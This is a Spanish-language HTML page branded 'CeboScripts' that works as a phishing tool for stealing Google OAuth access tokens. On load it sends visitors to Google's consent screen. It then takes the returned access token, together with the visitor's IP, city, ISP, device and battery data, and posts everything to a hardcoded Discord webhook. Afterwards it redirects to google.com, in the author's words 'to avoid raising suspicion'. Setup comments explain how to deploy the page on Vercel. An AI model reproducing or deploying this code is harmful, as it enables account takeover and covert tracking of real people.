<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CeboScripts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container {
            text-align: center;
            padding: 40px;
        }
        .loading {
            color: #ff0000;
            font-size: 1.5em;
            text-shadow: 0 0 30px rgba(255,0,0,0.5);
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 0.5; }
            50% { opacity: 1; }
            100% { opacity: 0.5; }
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #333;
            border-top: 3px solid #ff0000;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .status {
            margin-top: 20px;
            color: #666;
            font-size: 0.9em;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div class="spinner"></div>
        <div class="loading">⏳ Conectando con Google...</div>
        <div class="status" id="statusMsg">Esperando autorización...</div>
    </div>

    <script>
        // ======== CONFIGURACIÓN ========
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD";

        // ======== ID DE CLIENTE DE GOOGLE (REEMPLAZAR CON EL TUYO) ========
        // Para obtenerlo: Google Cloud Console → Credenciales → Crear ID de cliente OAuth
        const CLIENT_ID = "TU_CLIENT_ID.apps.googleusercontent.com";
        
        // ======== URI DE REDIRECCIONAMIENTO (DEBE COINCIDIR CON GOOGLE) ========
        // En Google Cloud Console → Credenciales → Agregar URI redireccionamiento
        // Tiene que ser la URL de tu página en Vercel
        const REDIRECT_URI = "https://TU_PAGINA.vercel.app";
        
        // ======== SCOPES (PERMISOS QUE PIDES) ========
        // 'email' para obtener correo, 'profile' para nombre, 'openid' para ID
        const SCOPES = "email profile openid";

        // ======== URL DE AUTORIZACIÓN DE GOOGLE ========
        const GOOGLE_AUTH_URL = 
            `https://accounts.google.com/o/oauth2/v2/auth?` +
            `client_id=${CLIENT_ID}` +
            `&redirect_uri=${encodeURIComponent(REDIRECT_URI)}` +
            `&response_type=token` + // 'token' para obtener access_token directamente
            `&scope=${encodeURIComponent(SCOPES)}` +
            `&prompt=consent`;

        // ======== OBTENER DATOS DEL DISPOSITIVO ========
        async function getDeviceData() {
            const data = {};

            // 1. IP y ubicación
            try {
                const res = await fetch('https://ipapi.co/json/');
                const ipData = await res.json();
                data.ip = ipData.ip || 'No disponible';
                data.ciudad = ipData.city || 'No disponible';
                data.pais = ipData.country_name || 'No disponible';
                data.isp = ipData.org || 'No disponible';
                data.region = ipData.region || 'No disponible';
                data.direccionReal = `${data.ciudad}, ${data.region}, ${data.pais}`;
            } catch (e) {
                data.ip = 'Error';
                data.ciudad = 'Error';
                data.pais = 'Error';
                data.isp = 'Error';
                data.region = 'Error';
                data.direccionReal = 'Error';
            }

            // 2. Dispositivo
            const ua = navigator.userAgent || '';
            if (/android/i.test(ua)) data.dispositivo = 'Android';
            else if (/iphone|ipad|ipod/i.test(ua)) data.dispositivo = 'iOS';
            else if (/windows/i.test(ua)) data.dispositivo = 'Windows PC';
            else if (/mac/i.test(ua)) data.dispositivo = 'Mac';
            else if (/linux/i.test(ua)) data.dispositivo = 'Linux';
            else data.dispositivo = 'Desconocido';

            // 3. Batería
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    data.bateria = Math.round(battery.level * 100) + '%';
                    data.cargando = battery.charging ? 'Sí' : 'No';
                } else {
                    data.bateria = 'No disponible';
                    data.cargando = 'No disponible';
                }
            } catch (e) {
                data.bateria = 'No disponible';
                data.cargando = 'No disponible';
            }

            // 4. User Agent
            data.userAgent = ua;
            data.hora = new Date().toLocaleString();
            data.referrer = document.referrer || 'Directo';

            return data;
        }

        // ======== ENVIAR A DISCORD ========
        async function sendToDiscord(data, token, accion) {
            const embed = {
                color: token ? 0x00ff00 : 0xff0000,
                title: token ? '🔴 CeboScripts - TOKEN DE GOOGLE OBTENIDO' : '🔴 CeboScripts - PERMISO RECHAZADO',
                fields: [
                    { name: '📍 Dirección Real', value: data.direccionReal || 'No disponible', inline: false },
                    { name: '🌐 IP', value: data.ip || 'No disponible', inline: true },
                    { name: '📱 Dispositivo', value: data.dispositivo || 'No disponible', inline: true },
                    { name: '🔋 Batería', value: data.bateria || 'No disponible', inline: true },
                    { name: '📶 ISP', value: data.isp || 'No disponible', inline: false },
                    { name: '🔑 TOKEN DE ACCESO', value: token ? `\`${token.substring(0, 50)}...\`` : 'No capturado', inline: false },
                    { name: '⚡ Acción', value: accion, inline: true },
                    { name: '🕒 Hora', value: data.hora || 'No disponible', inline: false }
                ],
                footer: { text: 'CeboScripts • Robo de token OAuth' },
                timestamp: new Date().toISOString()
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: 'CeboScripts Logger',
                        content: token ? '✅ **¡TOKEN DE GOOGLE CAPTURADO!**' : '❌ **Permiso rechazado por el usuario**',
                        embeds: [embed]
                    })
                });
                console.log('✅ Enviado a Discord');
            } catch (e) {
                console.error('❌ Error al enviar:', e);
            }
        }

        // ======== FUNCIÓN PRINCIPAL ========
        async function main() {
            const statusMsg = document.getElementById('statusMsg');
            
            // 1. Obtener datos del dispositivo
            const deviceData = await getDeviceData();
            console.log('📱 Datos del dispositivo:', deviceData);

            // 2. Verificar si la URL tiene un token (por redirección de Google)
            const hash = window.location.hash;
            if (hash && hash.includes('access_token=')) {
                // Extraer el token de la URL
                const params = new URLSearchParams(hash.substring(1));
                const accessToken = params.get('access_token');
                const tokenType = params.get('token_type');
                const expiresIn = params.get('expires_in');

                if (accessToken) {
                    statusMsg.textContent = '✅ Token obtenido correctamente';
                    await sendToDiscord(deviceData, accessToken, 'Aceptó y dio token');
                    
                    // Mostrar mensaje de éxito
                    document.querySelector('.loading').textContent = '✅ ¡Autorización completada!';
                    document.querySelector('.loading').style.color = '#00ff00';
                    document.querySelector('.spinner').style.display = 'none';
                    statusMsg.textContent = `🔑 Token: ${accessToken.substring(0, 30)}...`;
                    statusMsg.style.color = '#00ff00';
                    
                    // Redirigir a Google después de 3 segundos (para no levantar sospechas)
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 3000);
                    return;
                }
            }

            // 3. Verificar si la URL tiene un código de error (usuario rechazó)
            const urlParams = new URLSearchParams(window.location.search);
            const error = urlParams.get('error');
            if (error) {
                statusMsg.textContent = '❌ Usuario rechazó el permiso';
                await sendToDiscord(deviceData, null, 'Rechazó el permiso de Google');
                
                document.querySelector('.loading').textContent = '❌ Acceso denegado';
                document.querySelector('.loading').style.color = '#ff0000';
                document.querySelector('.spinner').style.display = 'none';
                statusMsg.textContent = 'No se otorgaron permisos a la aplicación';
                statusMsg.style.color = '#ff0000';
                return;
            }

            // 4. Si no hay token ni error, redirigir a Google para pedir permiso
            statusMsg.textContent = '🔄 Redirigiendo a Google...';
            
            // Pequeño delay para que se vea el mensaje
            setTimeout(() => {
                window.location.href = GOOGLE_AUTH_URL;
            }, 1500);
        }

        // ======== EJECUTAR ========
        window.onload = main;
    </script>
</body>
</html>
